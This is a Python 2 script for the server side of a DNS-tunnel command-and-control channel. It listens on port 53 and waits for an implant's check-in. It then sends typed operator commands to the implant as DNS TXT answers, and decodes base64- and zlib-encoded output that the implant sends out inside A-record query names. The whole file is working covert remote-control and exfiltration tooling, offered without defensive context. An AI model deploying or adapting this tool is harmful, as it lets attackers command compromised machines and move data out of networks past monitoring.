# -*- coding:utf-8 -*-

from gevent import socket
from dnslib import *
import zlib
import base64

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('192.10.22.22', 53))
IP = "1.1.1.1"
b64str = ''


def dns_handle(s, addr, data, command):
    request = DNSRecord.parse(data)
    id = request.header.id
    qname = request.q.qname
    qtype = request.q.qtype
    reply = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)
    flag = 0
    global b64str
    if qtype == QTYPE.A:
        if qname.label[0] != 'end':
            str = ''.join(qname.label).replace('ns1pangjieml', '')  #根据实际域名更改'ns1pangjieml'
            b64str += str
        else:
            print zlib.decompress(base64.b64decode(b64str.replace('-', '+').replace('~', '=')))
            b64str = ''
            flag = 1
        reply.add_answer(RR(qname, qtype, rdata=A(IP)))
        
    elif qtype == QTYPE.TXT:
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(command)))
        if 'sleep' in command:
            flag = 1
    s.sendto(reply.pack(), addr)
    return flag


def dns_connect(s, addr, data):
    request = DNSRecord.parse(data)
    id = request.header.id
    qname = request.q.qname
    qtype = request.q.qtype
    reply = DNSRecord(DNSHeader(id=id, qr=1, aa=1, ra=1), q=request.q)
    if qtype == QTYPE.A:
        if 'success' in qname.label:
            reply.add_answer(RR(qname, QTYPE.TXT, rdata=A(IP)))
            s.sendto(reply.pack(), addr)
            return True
    else:
        return False


if __name__ == '__main__':
    print 'waitting connect........'
    while True:
        data, addr = s.recvfrom(8192)
        if dns_connect(s, addr, data):
            print 'connect success'
            break
    while True:
        command = raw_input('#')
        while True:
            data, addr = s.recvfrom(8192)
            if dns_handle(s, addr, data, command):
                command = ''
                break


